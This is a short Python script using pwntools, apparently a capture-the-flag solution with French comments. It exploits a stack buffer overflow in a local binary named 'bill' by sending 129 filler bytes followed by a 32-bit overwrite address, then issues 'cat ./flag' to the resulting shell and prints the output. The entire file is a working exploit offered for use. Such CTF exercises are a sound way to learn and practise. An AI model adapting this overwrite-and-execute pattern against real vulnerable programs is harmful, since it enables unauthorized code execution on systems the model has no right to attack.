from pwn import p32, process


def buffer_overflow(binary_path: str, offset: int, addr_to_write: int) -> str:
    io = process(binary_path)
    # Produit le buffer overflow
    payload = b"0" * offset
    payload += p32(addr_to_write)
    io.sendline(payload)
    # Ignore la ligne retournée par le binaire
    io.recvline()
    # Lis le flag et affiche la sortie
    io.sendline(b"cat ./flag")
    flag = io.recvall(timeout=0.1)
    return flag.decode().strip()


if __name__ == "__main__":
    # Configuration (offset obtenu avec gdb et la commande cyclic -l)
    flag = buffer_overflow("./bill", offset=129, addr_to_write=0x080491A6)
    print(f"Flag: {flag}")
